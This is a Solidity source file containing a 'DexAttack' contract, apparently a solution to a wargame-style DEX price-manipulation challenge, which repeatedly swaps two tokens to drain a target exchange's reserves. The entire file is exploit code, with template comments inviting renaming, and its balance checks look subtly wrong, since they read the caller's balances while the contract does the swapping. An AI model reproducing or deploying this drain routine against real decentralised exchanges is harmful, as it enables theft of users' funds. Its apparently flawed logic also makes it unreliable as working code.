// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;


interface IDex { // 1) change interface name

    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function token1() external view returns (address);
    function token2() external view returns (address);
    function balanceOf(address token, address account) external view returns (uint256);

}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract DexAttack { // 2) change nameattck

    IDex target;

    constructor(address _target) {

        target = IDex(_target);
    }

    function attack() external {

        address token1 = target.token1();
        address token2 = target.token2();

        target.approve(address(target), type(uint256).max);

        while (
        IERC20(token1).balanceOf(address(target)) > 0 &&
        IERC20(token2).balanceOf(address(target)) > 0
    ) {
        uint bal1 = IERC20(token1).balanceOf(msg.sender);
        uint bal2 = IERC20(token2).balanceOf(msg.sender);

        if (bal1 > 0) {
            target.swap(token1, token2, bal1);
        } else {
            target.swap(token2, token1, bal2);
        }
    }
    }
}